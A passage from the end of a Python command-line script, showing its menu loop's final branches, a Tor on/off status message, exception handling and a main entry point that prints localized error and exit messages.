                        print(f"Tor {t.get('enabled' if Config.USE_TOR else 'disabled')}")

                    else:
                        print(t.get('invalid_option'))

                print("\n[!] " + t.get('error_invalid_option'))

        except KeyboardInterrupt:
            print("\n[!] " + t.get('operation_cancelled'))
            continue
        except Exception as e:
            print("\n[!] " + t.get('error_general') + ": " + str(e))
            continue


if __name__ == "__main__":  
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] " + t.get('operation_cancelled'))
        print("\n[!] " + t.get('app_terminated'))
        sys.exit(0)
    except Exception as e:
        print("[!] " + t.get('critical_error') + ": " + str(e))
        sys.exit(1)
